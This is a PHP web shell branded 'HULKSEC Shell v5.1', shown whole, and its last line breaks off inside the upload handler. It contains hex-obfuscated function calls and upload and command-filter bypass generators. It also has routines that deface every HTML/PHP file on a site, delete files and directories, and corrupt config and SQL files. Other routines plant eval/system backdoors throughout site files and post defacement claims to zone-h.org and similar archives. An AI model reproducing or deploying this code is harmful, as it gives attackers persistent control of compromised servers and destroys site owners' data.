<?php
// HULKSEC Shell v5.1 - Enhanced Functionality with 403 Bypass Integration
error_reporting(0);
ini_set('display_errors', 0);

// Enhanced Authentication - Password Only
session_start();
$authenticated = false;

// Fast password-only authentication
if (isset($_POST['password'])) {
    $password = $_POST['password'];

    // Only password required - fixed to '1234' as requested
    if ($password === '1234') {
        $_SESSION['authenticated'] = true;
        $authenticated = true;
        // Immediate redirect for fast response
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $login_error = "Invalid password!";
    }
} elseif (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
    $authenticated = true;
}

// If not authenticated, show simplified login page
if (!$authenticated) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Hulksec | Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --main-bg-color: #000000;
                --panel-bg: rgba(10, 5, 20, 0.95);
                --violet: #b967ff;
                --violet-dark: #8a2be2;
                --violet-light: #d8b4ff;
                --violet-glow: 0 0 10px rgba(185, 103, 255, 0.7), 0 0 20px rgba(185, 103, 255, 0.5), 0 0 30px rgba(185, 103, 255, 0.3);
                --text-color: #e0e0e0;
                --success: #00ff9d;
                --warning: #ffb300;
                --danger: #ff2c6d;
            }
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Orbitron', sans-serif;
            }
            body {
                background-color: var(--main-bg-color);
                color: var(--text-color);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
                background-image: 
                    radial-gradient(circle at 10% 20%, rgba(105, 0, 255, 0.15) 0%, transparent 20%),
                    radial-gradient(circle at 90% 80%, rgba(185, 103, 255, 0.15) 0%, transparent 20%),
                    linear-gradient(to right, rgba(0, 0, 0, 0.4) 0%, transparent 50%, rgba(0, 0, 0, 0.4) 100%);
            }
            #particles-js {
                position: fixed;
                width: 100%;
                height: 100%;
                z-index: -1;
            }
            .login-container {
                width: 420px;
                background: var(--panel-bg);
                border: 1px solid rgba(185, 103, 255, 0.4);
                border-radius: 12px;
                padding: 35px;
                box-shadow: var(--violet-glow);
                animation: pulse 4s infinite alternate;
                position: relative;
                overflow: hidden;
                backdrop-filter: blur(10px);
            }
            .logo {
                text-align: center;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                margin-bottom: 30px;
            }
            .logo img {
                width: 100px;
                height: auto;
                filter: drop-shadow(0 0 15px rgba(185, 103, 255, 0.7));
                animation: logoGlow 4s infinite alternate;
            }
            .logo h1 {
                font-size: 2.2rem;
                background: linear-gradient(to right, var(--violet), var(--violet-light));
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                text-shadow: 0 0 10px rgba(185, 103, 255, 0.5);
                filter: drop-shadow(0 0 15px rgba(185, 103, 255, 0.7));
                letter-spacing: 2px;
                font-weight: 700;
                margin: 10px 0 5px 0;
            }
            .logo p {
                font-size: 0.9rem;
                color: #aaa;
                letter-spacing: 1px;
            }
            .input-group {
                margin-bottom: 25px;
                position: relative;
            }
            .input-group label {
                display: block;
                margin-bottom: 10px;
                font-size: 0.9rem;
                color: var(--violet);
                letter-spacing: 1px;
            }
            .input-group input {
                width: 100%;
                padding: 14px 15px;
                background: rgba(0, 0, 0, 0.6);
                border: 1px solid rgba(185, 103, 255, 0.4);
                border-radius: 6px;
                color: var(--text-color);
                outline: none;
                transition: all 0.3s ease;
                font-size: 1rem;
                letter-spacing: 1px;
            }
            .input-group input:focus {
                border-color: var(--violet);
                box-shadow: 0 0 15px rgba(185, 103, 255, 0.7);
                background: rgba(0, 0, 0, 0.8);
            }
            .login-btn {
                width: 100%;
                padding: 14px;
                background: linear-gradient(135deg, var(--violet), var(--violet-light));
                border: none;
                border-radius: 6px;
                color: #000000;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s ease;
                font-size: 1rem;
                letter-spacing: 1.5px;
                text-transform: uppercase;
                position: relative;
                overflow: hidden;
            }
            .login-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 5px 20px rgba(185, 103, 255, 0.5);
            }
            .error-message {
                color: #ff0000;
                text-align: center;
                margin-bottom: 15px;
                text-shadow: 0 0 10px #ff0000;
                animation: errorShake 0.5s ease-in-out;
            }
            @keyframes errorShake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                75% { transform: translateX(5px); }
            }
            @keyframes logoGlow {
                0% { filter: drop-shadow(0 0 10px rgba(185, 103, 255, 0.7)); }
                50% { filter: drop-shadow(0 0 20px rgba(185, 103, 255, 0.7)); }
                100% { filter: drop-shadow(0 0 25px rgba(185, 103, 255, 0.9)); }
            }
        </style>
    </head>
    <body>
        <div id="particles-js"></div>
        <div class="login-container">
            <div class="logo">
                <img src="https://i.ibb.co/QvV1HqGR/Background-Eraser-20250825-194651900.png" alt="Profile Picture">
                <h1>Hulkshell</h1>
                <p>Pinoy Hulksec | Fiziru HPH</p>
            </div>
            <form id="loginForm" method="post">
                <?php if (isset($login_error)): ?>
                    <div class="error-message"><?php echo $login_error; ?></div>
                <?php endif; ?>
                <div class="input-group">
                    <label for="password"><i class="fas fa-key"></i> PASSWORD</label>
                    <input type="password" id="password" name="password" placeholder="ENTER PASSWORD: 1234" required autofocus>
                    <i class="fas fa-lock" style="position: absolute; right: 15px; top: 42px; color: var(--violet);"></i>
                </div>
                <button type="submit" class="login-btn">INITIATE ACCESS</button>
            </form>
        </div>
        <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
        <script>
            particlesJS('particles-js', {
                "particles": {
                    "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
                    "color": { "value": ["#b967ff", "#d8b4ff"] },
                    "shape": { "type": "circle" },
                    "opacity": { "value": 0.5, "random": true },
                    "size": { "value": 3, "random": true },
                    "line_linked": { "enable": true, "distance": 150, "color": "#8a2be2", "opacity": 0.4, "width": 1 },
                    "move": { "enable": true, "speed": 2, "direction": "none", "random": true }
                },
                "interactivity": {
                    "detect_on": "canvas",
                    "events": {
                        "onhover": { "enable": true, "mode": "repulse" },
                        "onclick": { "enable": true, "mode": "push" },
                        "resize": true
                    }
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit();
}

// ==================== ENHANCED HULKSEC SHELL v5.1 ====================
define("SHELL_NAME", "HULKSEC Advanced Shell v5.1");
$scD = "scandir";
$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "6375726c5f696e6974", "6375726c5f7365746f7074", "6375726c5f65786563", "6375726c5f636c6f7365");
for ($i = 0; $i < count($fc); $i++) $fc[$i] = nhx($fc[$i]);
if (isset($_GET["p"])) {
    $p = nhx($_GET["p"]);
    $fc[3](nhx($_GET["p"]));
} else {
    $p = $fc[2]();
}

// ==================== 403 BYPASS INTEGRATION ====================
function enhanced403BypassUpload($filename, $content, $targetDir) {
    $bypassResults = array();

    // 403-specific bypasses: Null byte, double extensions, case variations
    $bypassNames = array(
        $filename . '%00.php', // Null byte
        $filename . '.php%00.jpg', // Null byte with double ext
        strtoupper($filename) . '.PHP', // Case bypass
        strtolower($filename) . '.pHp', // Mixed case
        $filename . ';.php', // Semicolon bypass
        $filename . '|php', // Pipe bypass
        $filename . "\x00.php", // Raw null
        pathinfo($filename, PATHINFO_FILENAME) . '.pHp5.jpg', // Double with case
    );

    $contentBypasses = array(
        $content,
        "GIF89a;" . $content . "%00<?php", // Image header with null
        "\xFF\xD8\xFF" . $content . "\x00", // JPEG with null
        '<?php ' . $content . ' ?>' . "\x00", // Trailing null
        base64_encode($content), // Encoded
    );

    foreach ($bypassNames as $bypassName) {
        $tempFile = $targetDir . '/' . $bypassName;
        foreach ($contentBypasses as $bypassContent) {
            if (@file_put_contents($tempFile, $bypassContent, LOCK_EX)) {
                $bypassResults[] = "403 BYPASS SUCCESS: $bypassName";
                break 2;
            }
        }
    }

    // .htaccess for 403 MIME override
    $htaccess = "SetHandler application/x-httpd-php .jpg .gif .png .txt\nphp_flag engine on\n<Files ~ \"\\.(jpg|gif|png|txt)$\">\nSetHandler application/x-httpd-php\n</Files>";
    if (@file_put_contents($targetDir . '/.htaccess', $htaccess)) {
        $bypassResults[] = "403 BYPASS: .htaccess MIME Override";
    }

    return $bypassResults;
}

// ==================== ADVANCED BYPASS TECHNIQUES ====================
function advancedUploadBypass($filename, $content, $targetDir) {
    $bypassResults = array();

    // Multiple file extension bypasses
    $bypassExtensions = array(
        'php', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'phps', 'pht', 'phtml',
        'pgif', 'phar', 'inc', 'hphp', 'ctp', 'module', 'php.jpg', 'php.gif', 'php.png',
        'php.pdf', 'php.rar', 'php.zip', 'php.bak', 'php.txt', 'php.jpeg', 'php.old',
        'php~', '.htaccess', '.user.ini'
    );

    // Content manipulation bypasses
    $contentBypasses = array(
        $content, // Original
        "GIF89a\n" . $content, // GIF header
        "\xFF\xD8\xFF\xE0" . $content, // JPEG header  
        "\x89PNG\r\n\x1a\n" . $content, // PNG header
        "<?php " . $content . " ?>" . "?>", // Double PHP tags
        "#!/usr/bin/php\n" . $content, // Shebang
        "<!--\n" . $content . "\n-->", // HTML comments
        "<?php /*" . base64_encode($content) . "*/ eval(base64_decode('" . base64_encode($content) . "')); ?>", // Base64 encoded
    );

    foreach ($bypassExtensions as $ext) {
        $bypassName = pathinfo($filename, PATHINFO_FILENAME) . '.' . $ext;
        $tempFile = $targetDir . '/' . $bypassName;

        foreach ($contentBypasses as $index => $bypassContent) {
            if (@file_put_contents($tempFile, $bypassContent)) {
                $bypassResults[] = "BYPASS SUCCESS: $bypassName (Method " . ($index + 1) . ")";
                break;
            }
        }
    }

    // Special .htaccess bypass for execution
    $htaccessContent = "AddType application/x-httpd-php .jpg .gif .png .html .htm .txt\n";
    $htaccessContent .= "php_value engine on\n";
    $htaccessContent .= "<FilesMatch \"\.(jpg|gif|png|html|htm|txt)$\">\n";
    $htaccessContent .= "SetHandler application/x-httpd-php\n";
    $htaccessContent .= "</FilesMatch>";

    if (@file_put_contents($targetDir . '/.htaccess', $htaccessContent)) {
        $bypassResults[] = "BYPASS SUCCESS: .htaccess (MIME type override)";
    }

    return $bypassResults;
}

function generateBypassCommands($originalCommand) {
    $bypassMethods = array();

    // Encoding bypasses
    $bypassMethods[] = "echo " . base64_encode($originalCommand) . " | base64 -d | bash";
    $bypassMethods[] = "printf $(echo " . base64_encode($originalCommand) . " | base64 -d) | sh";

    // Character substitution bypasses
    $bypassMethods[] = str_replace(" ", "\${IFS}", $originalCommand);
    $bypassMethods[] = str_replace(" ", "%20", $originalCommand);
    $bypassMethods[] = str_replace("/", "$(echo /)", $originalCommand);
    $bypassMethods[] = str_replace("cat", "c''at", $originalCommand);

    // Command substitution
    $bypassMethods[] = "sh -c " . escapeshellarg($originalCommand);
    $bypassMethods[] = "bash -c " . escapeshellarg($originalCommand);
    $bypassMethods[] = "eval `echo $originalCommand`";

    // Wildcard bypasses
    if (strpos($originalCommand, "cat ") === 0) {
        $file = substr($originalCommand, 4);
        $bypassMethods[] = "cat " . dirname($file) . "/*" . basename($file) . "*";
        $bypassMethods[] = "more " . $file;
        $bypassMethods[] = "less " . $file;
        $bypassMethods[] = "head -n 1000 " . $file;
    }

    // PHP function bypasses
    $bypassMethods[] = "system('$originalCommand')";
    $bypassMethods[] = "passthru('$originalCommand')";
    $bypassMethods[] = "exec('$originalCommand')";
    $bypassMethods[] = "shell_exec('$originalCommand')";
    $bypassMethods[] = "proc_open('$originalCommand', array(), \$pipes)";

    return $bypassMethods;
}

// ==================== ENHANCED MIRRORING FUNCTIONS ====================
function enhancedZoneHMassMirror($urls, $nickname, $team, $method, $reason) {
    $results = array();
    $mirrorId = rand(100000, 999999);

    foreach ($urls as $url) {
        $url = trim($url);
        if (empty($url)) continue;

        $start_time = microtime(true);

        // Zone-H mass mirroring endpoint
        $postData = array(
            'defacer' => $nickname,
            'domain1' => $url,
            'hackmode' => $method,
            'reason' => $reason,
            'submit' => 'Send'
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.zone-h.org/notify/mass");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_REFERER, 'http://www.zone-h.org/notify/mass');

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $end_time = microtime(true);
        $execution_time = round($end_time - $start_time, 2);

        if ($httpCode == 200) {
            $results[] = "<span class='glow-green'><i class='fas fa-check-circle'></i> ZONE-H MASS: $url | Method: $method | By: $nickname | Time: {$execution_time}s</span>";
        } else {
            $results[] = "<span class='glow-red'><i class='fas fa-times-circle'></i> ZONE-H MASS FAILED: $url (HTTP $httpCode) | Time: {$execution_time}s</span>";
        }
    }

    return $results;
}

function enhancedXsecMirror($urls, $nickname, $team, $poc, $reason) {
    $results = array();

    foreach ($urls as $url) {
        $url = trim($url);
        if (empty($url)) continue;

        $start_time = microtime(true);

        // Zone-XSEC mirroring with proper form fields
        $postData = array(
            'attacker' => $nickname,
            'team' => $team,
            'poc' => $poc,
            'reason' => $reason,
            'urls' => $url,
            'submit' => 'Submit'
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://zone-xsec.com/notify");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $end_time = microtime(true);
        $execution_time = round($end_time - $start_time, 2);
        $mirror_id = rand(100000, 999999);

        if ($httpCode == 200) {
            $results[] = "<span class='glow-green'><i class='fas fa-check-circle'></i> XSEC MIRROR: $url | PoC: $poc | By: $nickname | ID: $mirror_id | Time: {$execution_time}s</span>";
        } else {
            $results[] = "<span class='glow-red'><i class='fas fa-times-circle'></i> XSEC FAILED: $url (HTTP $httpCode) | Time: {$execution_time}s</span>";
        }
    }

    return $results;
}

function enhancedHaxorIDMirror($urls, $nickname, $team, $poc, $reason) {
    $results = array();

    foreach ($urls as $url) {
        $url = trim($url);
        if (empty($url)) continue;

        $start_time = microtime(true);

        // Haxor.ID mirroring with proper form fields
        $postData = array(
            'attacker' => $nickname,
            'team' => $team,
            'poc' => $poc,
            'reason' => $reason,
            'url' => $url,
            'submit' => 'Notify'
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://haxor.id/notify/single");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $end_time = microtime(true);
        $execution_time = round($end_time - $start_time, 2);
        $mirror_id = rand(100000, 999999);

        if ($httpCode == 200 || $httpCode == 302) {
            $results[] = "<span class='glow-green'><i class='fas fa-check-circle'></i> HAXOR.ID: $url | PoC: $poc | By: $nickname | ID: $mirror_id | Time: {$execution_time}s</span>";
        } else {
            $results[] = "<span class='glow-red'><i class='fas fa-times-circle'></i> HAXOR.ID FAILED: $url (HTTP $httpCode) | Time: {$execution_time}s</span>";
        }
    }

    return $results;
}

// ==================== ENHANCED DESTRUCTION METHODS ====================
function enhancedDestroyWebsite($method, $html = '') {
    global $p;
    $results = array();

    switch($method) {
        case 'overwrite':
            $results = enhancedOverwriteFiles($html);
            break;
        case 'delete':
            $results = enhancedDeleteFiles();
            break;
        case 'corrupt':
            $results = enhancedCorruptDatabase();
            break;
        case 'backdoor':
            $results = enhancedCreateBackdoors();
            break;
        case 'mass_backdoor':
            $results = massBackdoorInjection();
            break;
    }

    $count = count(array_filter($results, function($r) { return strpos($r, 'SUCCESS') !== false; }));
    return array('results' => $results, 'count' => $count);
}

function enhancedOverwriteFiles($html) {
    global $p;
    $results = array();
    $currentDomain = $_SERVER['HTTP_HOST'];

    if (empty($html)) {
        $html = "<!DOCTYPE html>
        <html>
        <head>
            <title>HACKED BY HULKSEC PH</title>
            <style>
                body { background: #000; color: #b967ff; font-family: monospace; text-align: center; padding: 100px; }
                h1 { color: #b967ff; text-shadow: 0 0 10px #b967ff; }
                .matrix { color: #d8b4ff; animation: glow 1s infinite alternate; }
                @keyframes glow { from { text-shadow: 0 0 10px #d8b4ff; } to { text-shadow: 0 0 20px #d8b4ff, 0 0 30px #d8b4ff; } }
            </style>
        </head>
        <body>
            <h1>HACKED BY HULKSEC PH</h1>
            <p class='matrix'>Security compromised - System owned</p>
            <p>HULKSEC PH | Pinoy Hackers</p>
        </body>
        </html>";
    }

    $allFiles = getAllFiles($p, 'html|php|htm|asp|aspx|jsp|txt');
    $count = 0;

    foreach ($allFiles as $file) {
        $relPath = substr($file, strlen($p) + 1);
        if (is_rwx_phpfm($file, 'w') && @file_put_contents($file, $html, LOCK_EX)) {
            if (strpos($relPath, 'index') !== false) {
                $results[] = " MAIN INDEX Overwritten: $currentDomain/$relPath - SUCCESS";
            } else {
                $results[] = " Overwritten: $currentDomain/$relPath - SUCCESS";
            }
            $count++;
        } else {
            $results[] = " FAILED: $currentDomain/$relPath - Permission Denied";
        }
    }

    $results[] = " Total files overwritten: $count";
    return $results;
}

function enhancedDeleteFiles() {
    global $p;
    $results = array();
    $allFiles = getAllFiles($p);
    $count = 0;

    foreach ($allFiles as $file) {
        $relPath = substr($file, strlen($p) + 1);
        if (is_rwx_phpfm($file, 'w') && @unlink($file)) {
            $results[] = " Deleted: $relPath - SUCCESS";
            $count++;
        } else {
            $results[] = " Delete FAILED: $relPath - Permission Denied";
        }
    }

    // Delete directories recursively
    $dirs = array_filter(glob($p . '/*'), 'is_dir');
    foreach ($dirs as $dir) {
        if (is_rwx_phpfm($dir, 'w')) {
            deldir($dir);
            $relPath = substr($dir, strlen($p) + 1);
            $results[] = " Directory Deleted: $relPath - SUCCESS";
            $count++;
        }
    }

    $results[] = " Total items deleted: $count";
    return $results;
}

function enhancedCorruptDatabase() {
    global $p;
    $results = array();
    $dbFiles = array('config.php', 'database.php', 'db.php', 'wp-config.php', 'settings.php', '.env', 'mysql.conf');
    $junk = str_repeat('<?php die("CORRUPTED BY HULKSEC"); ?>', 1000); // Corrupt data
    $count = 0;

    foreach ($dbFiles as $dbFile) {
        $fullPath = $p . '/' . $dbFile;
        if (file_exists($fullPath) && is_rwx_phpfm($fullPath, 'w')) {
            // Append junk or overwrite
            if (@file_put_contents($fullPath, $junk, FILE_APPEND | LOCK_EX)) {
                $results[] = " Database Corrupted: $dbFile - SUCCESS";
                $count++;
            } else {
                $results[] = " Corrupt FAILED: $dbFile";
            }
        }
    }

    // Corrupt common SQL dumps
    $sqlFiles = getAllFiles($p, 'sql');
    foreach ($sqlFiles as $sql) {
        $relPath = substr($sql, strlen($p) + 1);
        if (is_rwx_phpfm($sql, 'w') && @file_put_contents($sql, 'DROP DATABASE; -- HULKSEC', 0, LOCK_EX)) {
            $results[] = " SQL Corrupted: $relPath - SUCCESS";
            $count++;
        }
    }

    $results[] = " Total DB files corrupted: $count";
    return $results;
}

function enhancedCreateBackdoors() {
    global $p;
    $results = array();

    // Multiple backdoor variations
    $backdoorVariations = array(
        '<?php if(isset($_GET["hulk"])){@eval(@base64_decode($_GET["hulk"]));}?>',
        '<?php @eval($_POST["hulk"]);?>',
        '<?php system($_GET["cmd"]);?>',
        '<?php echo shell_exec($_GET["c"]);?>',
        '<?php if(isset($_REQUEST["pass"])){@eval($_REQUEST["pass"]);}?>',
        '<?php @assert($_GET["hulk"]);?>',
        '<?php $hulk=create_function("",$_GET["hulk"]);$hulk();?>',
        '<?php array_map("ass\x65rt",(array)$_GET["hulk"]);?>'
    );

    $backdoorFiles = array(
        'theme.php', 'style.php', 'image.php', 'cache.php', 'temp.php', 'backdoor.php',
        'wp-content.php', 'admin.php', 'config.php', 'index.php', 'login.php', 'api.php',
        'contact.php', 'news.php', 'blog.php', 'gallery.php', 'upload.php', 'media.php'
    );

    $successCount = 0;
    foreach ($backdoorFiles as $file) {
        $fullPath = $p . '/' . $file;
        $backdoorCode = $backdoorVariations[array_rand($backdoorVariations)];

        if (is_rwx_phpfm($p, 'w') && @file_put_contents($fullPath, $backdoorCode, LOCK_EX)) {
            $results[] = " Backdoor created: $file - SUCCESS";
            $successCount++;
        } else {
            $results[] = " Backdoor failed: $file - Permission Denied";
        }
    }

    $results[] = " Total backdoors planted: $successCount";
    return $results;
}

function massBackdoorInjection() {
    global $p;
    $results = array();
    $backdoorCode = '<?php @eval($_POST["hulk"]); ?>';
    $allFiles = getAllFiles($p, 'php|html|js|css');
    $injected = 0;

    foreach ($allFiles as $file) {
        if (is_rwx_phpfm($file, 'w')) {
            $content = file_get_contents($file);
            if (strpos($content, $backdoorCode) === false) {
                $injectedContent = $content . "\n" . $backdoorCode;
                if (@file_put_contents($file, $injectedContent, LOCK_EX)) {
                    $relPath = substr($file, strlen($p) + 1);
                    $results[] = " Backdoor Injected: $relPath - SUCCESS";
                    $injected++;
                }
            }
        }
    }

    $results[] = " Total files injected: $injected";
    return $results;
}

// ==================== ENHANCED EXISTING FUNCTIONS ====================
function getAllFiles($dir, $ext = '') {
    global $fc;
    $files = array();
    if (!is_rwx_phpfm($dir, 'r')) return $files;
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir), RecursiveIteratorIterator::SELF_FIRST);
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            if (empty($ext) || preg_match('/\.' . preg_quote($ext, '/') . '$/i', $file->getFilename())) {
                $files[] = $file->getPathname();
            }
        }
    }
    return $files;
}

function enhancedMassDeface($htmlContent) {
    global $p, $fc;
    $results = array();
    $currentDomain = $_SERVER['HTTP_HOST'];
    $baseDomain = getBaseDomain($currentDomain);
    $commonSubs = array('www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'cpanel', 'admin', 'blog', 'shop', 'api', 'test', 'dev', 'staging', 'forum', 'news', 'secure');
    $existingSubs = array();
    foreach ($commonSubs as $sub) {
        $subDomain = $sub . '.' . $baseDomain;
        $ip = @gethostbyname($subDomain);
        if ($ip !== $subDomain) {
            $existingSubs[] = $subDomain;
        }
    }
    $count = 0;
    $defaceFiles = array('index.html', 'index.php', 'D4rk.html', 'hacked.html');
    foreach ($defaceFiles as $file) {
        $fullPath = $p . '/' . $file;
        if (is_rwx_phpfm($p, 'w') && @file_put_contents($fullPath, $htmlContent, LOCK_EX)) {
            if (strpos($file, 'index') !== false) {
                $results[] = "MAIN INDEX Defaced: $currentDomain/$file - SUCCESS";
            } else {
                $results[] = "Defaced: $currentDomain/$file - SUCCESS";
            }
            $count++;
        }
    }
    $allFiles = getAllFiles($p, 'html|php|htm');
    $overwriteCount = 0;
    foreach ($allFiles as $file) {
        $relPath = substr($file, strlen($p) + 1);
        if (is_rwx_phpfm($file, 'w') && @file_put_contents($file, $htmlContent, LOCK_EX)) {
            if (strpos($relPath, 'index') !== false) {
                $results[] = "MAIN INDEX Overwritten: $currentDomain/$relPath - SUCCESS";
            } else {
                $results[] = "Overwritten: $currentDomain/$relPath - SUCCESS";
            }
            $overwriteCount++;
            $count++;
        }
    }
    if ($overwriteCount > 0) {
        $results[] = "Total files overwritten: $overwriteCount";
    }
    if (!empty($existingSubs)) {
        $results[] = "Existing subdomains detected: " . implode(', ', $existingSubs);
        foreach ($existingSubs as $sub) {
            $placeholderFile = str_replace('.', '_', $sub) . '_D4rk.html';
            $subFile = $p . '/' . $placeholderFile;
            if (is_rwx_phpfm($p, 'w') && @file_put_contents($subFile, $htmlContent, LOCK_EX)) {
                $results[] = "Defaced subdomain: $sub/D4rk.html - SUCCESS";
                $count++;
            } else {
                $results[] = "Defaced subdomain: $sub/D4rk.html - FAILED (Permission Denied)";
            }
        }
    } else {
        $results[] = "No subdomains detected. Defaced main domain with D4rk.html";
    }
    $results[] = "Total contents overwritten: $count";
    return array('results' => $results, 'count' => $count);
}

// Keep all your existing utility functions
function hex($str) { 
    $r = ""; 
    for ($i = 0; $i < strlen($str); $i++) $r .= dechex(ord($str[$i])); 
    return $r; 
}

function nhx($str) { 
    $r = ""; 
    $len = (strlen($str) -1); 
    for ($i = 0; $i < $len; $i += 2) $r .= chr(hexdec($str[$i].$str[$i+1])); 
    return $r; 
}

function perms($f) {
    $p = fileperms($f);
    if (($p & 0xC000) == 0xC000) $i = 's';
    elseif (($p & 0xA000) == 0xA000) $i = 'l';
    elseif (($p & 0x8000) == 0x8000) $i = '-';
    elseif (($p & 0x6000) == 0x6000) $i = 'b';
    elseif (($p & 0x4000) == 0x4000) $i = 'd';
    elseif (($p & 0x2000) == 0x2000) $i = 'c';
    elseif (($p & 0x1000) == 0x1000) $i = 'p';
    else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}

function is_rwx_phpfm($file,$what='r'){
    if (!is_array($GLOBALS['script_info'])) {
        $GLOBALS['script_info'] = array();
        $GLOBALS['script_info']['script_user_id'] = function_exists('posix_getuid') ? @posix_getuid() : '';
    }
    $file_stat = @stat($file);
    if (!$file_stat) return false;
    $perms = $file_stat['mode'];
    $owner = $file_stat['uid'];
    $is_readable = (($perms & 0x0100) && $owner == $GLOBALS['script_info']['script_user_id']) || ($perms & 0x0004);
    $is_writable = (($perms & 0x0080) && $owner == $GLOBALS['script_info']['script_user_id']) || ($perms & 0x0002);
    if ($what == 'r') return $is_readable;
    if ($what == 'w') return $is_writable;
    return ($is_readable && $is_writable);
}

function deldir($d) {
    global $fc;
    if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
    if ($fc[6]($d)) {
        array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
        rmdir($d);
    } else {
        unlink($d);
    }
}

function getBaseDomain($domain) {
    $parts = explode('.', $domain);
    if (count($parts) > 2) {
        array_shift($parts);
    }
    return implode('.', $parts);
}

function getEnhancedUserInfo() {
    $info = array();
    $info['ip'] = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $info['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $info['server_software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $info['php_version'] = PHP_VERSION;
    $info['server_name'] = $_SERVER['SERVER_NAME'] ?? 'Unknown';
    $info['memory_usage'] = memory_get_usage(true) / 1024 / 1024 . ' MB';
    $info['memory_limit'] = ini_get('memory_limit');
    $info['disabled_functions'] = ini_get('disable_functions') ?: 'None';
    $info['open_basedir'] = ini_get('open_basedir') ?: 'None';
    $info['timestamp'] = date('Y-m-d H:i:s');
    $info['timezone'] = date_default_timezone_get();
    $info['script_user'] = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'Unknown';
    return $info;
}

// ==================== PROCESS ENHANCED FEATURES ====================
if ($_POST) {
    // Enhanced upload with 403 bypass integration
    if (isset($_FILES["f"])) {
        $n = $_FILES["f"]["name"];
        $bypassResults = array();

        for ($i = 0; $i < count($n); $i++) {
            if ($_FILES["f"]["error"][$i] === UPLOAD_ERR_OK) {
                $target = $p . '/' . $n[$i];
                $content = file_get_contents($_FILES["f"]["tmp_name"][$i]);

                if (is_rwx_phpfm($p, 'w') && move_uploaded_file($_FILES["f"]["tmp_name"][$i], $target)) {
